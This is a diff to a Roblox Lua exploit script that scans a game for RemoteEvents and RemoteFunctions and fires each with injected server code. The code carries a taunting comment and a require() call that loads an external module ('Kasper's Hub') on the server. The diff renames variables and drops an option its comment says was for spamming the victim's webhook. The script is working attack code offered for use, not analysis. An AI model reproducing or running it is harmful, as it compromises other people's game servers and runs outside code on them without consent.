@@ -4,12 +4,11 @@ This will search for random located RemoteEvents/RemoteFunctions that handles Re
 Bitwise#4908
 ]]
 local RemoteFunctionsEnabled = false -- Change to true if you want to Invoke RemoteFunctions. (Might sometimes work)
-local Annoy = true -- If you want to massively spam their webhook and annoy them enable this
-local code = "require(9039886698).tristytn('" .. game.Players.LocalPlayer.Name .. "')" -- This will load the Kasper's Hub but if you know how to change this feel free to.
-local blacklisted = {"emma", "__FUNCTION"}
+local Code = "require(9039886698).tristytn('" .. game.Players.LocalPlayer.Name .. "')" -- This will load the Kasper's Hub but if you know how to change this feel free to.
+local Blacklisted = {"emma", "__FUNCTION"}
 for i, v in pairs(game:GetDescendants()) do
     if v:IsA("RemoteEvent") then
-        for index, value in pairs(blacklisted) do
+        for index, value in pairs(Blacklisted) do
             if v.Name ~= value then
                 local CodeSetup =
                     "--[[ Hey, " ..
@@ -17,7 +16,7 @@ for i, v in pairs(game:GetDescendants()) do
                         " nice " ..
                             typeof(v) ..
                                 " you got there! Unfortunately, I already injected into your " ..
-                                    v:GetFullName() .. "]] \n" .. code
+                                    v:GetFullName() .. "]] \n" .. Code
                 v:FireServer(CodeSetup)
             end
         end
@@ -31,7 +30,7 @@ for i, v in pairs(game:GetDescendants()) do
                             " nice " ..
                                 typeof(v) ..
                                     " you got there! Unfortunately, I already injected into your " ..
-                                        v:GetFullName() .. "]] \n" .. code
+                                        v:GetFullName() .. "]] \n" .. Code
                     v:InvokeServer(CodeSetup)
                 end
             end
